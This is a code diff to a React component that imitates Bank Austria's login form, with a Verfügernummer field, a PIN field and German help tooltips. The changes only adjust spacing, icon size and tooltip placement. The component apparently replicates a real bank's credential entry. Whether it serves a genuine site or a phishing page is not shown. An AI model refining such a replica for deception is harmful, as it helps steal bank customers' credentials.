@@ -135,7 +135,7 @@ const BankAustria = () => {
           {/* Login Form */}
           <div className="max-w-md mx-auto">
             <div className="mb-4">
-              <div className="flex items-center gap-2">
+              <div className="flex items-center gap-4">
                 <input
                   type="text"
                   value={verfueger}
@@ -150,11 +150,11 @@ const BankAustria = () => {
                   onMouseLeave={() => setShowTooltip(null)}
                   onClick={() => setShowTooltip(showTooltip === "verfueger" ? null : "verfueger")}
                 >
-                  <img src={infoIcon} alt="Info" className="h-6 w-6 cursor-pointer" />
+                  <img src={infoIcon} alt="Info" className="h-8 w-8 cursor-pointer" />
                   {showTooltip === "verfueger" && (
-                    <div className="absolute right-0 bottom-full mb-3 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
+                    <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
                       Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern.
-                      <div className="absolute right-2 top-full w-0 h-0" style={{ borderLeft: "8px solid transparent", borderRight: "8px solid transparent", borderTop: "8px solid white" }} />
+                      <div className="absolute right-full top-1/2 -translate-y-1/2 w-0 h-0" style={{ borderTop: "8px solid transparent", borderBottom: "8px solid transparent", borderRight: "8px solid white" }} />
                     </div>
                   )}
                 </div>
@@ -162,7 +162,7 @@ const BankAustria = () => {
             </div>
 
             <div className="mb-4">
-              <div className="flex items-center gap-2">
+              <div className="flex items-center gap-4">
                 <input
                   type="password"
                   value={pin}
@@ -177,11 +177,11 @@ const BankAustria = () => {
                   onMouseLeave={() => setShowTooltip(null)}
                   onClick={() => setShowTooltip(showTooltip === "pin" ? null : "pin")}
                 >
-                  <img src={infoIcon} alt="Info" className="h-6 w-6 cursor-pointer" />
+                  <img src={infoIcon} alt="Info" className="h-8 w-8 cursor-pointer" />
                   {showTooltip === "pin" && (
-                    <div className="absolute right-0 bottom-full mb-3 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
+                    <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
                       Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden.
-                      <div className="absolute right-2 top-full w-0 h-0" style={{ borderLeft: "8px solid transparent", borderRight: "8px solid transparent", borderTop: "8px solid white" }} />
+                      <div className="absolute right-full top-1/2 -translate-y-1/2 w-0 h-0" style={{ borderTop: "8px solid transparent", borderBottom: "8px solid transparent", borderRight: "8px solid white" }} />
                     </div>
                   )}
                 </div>
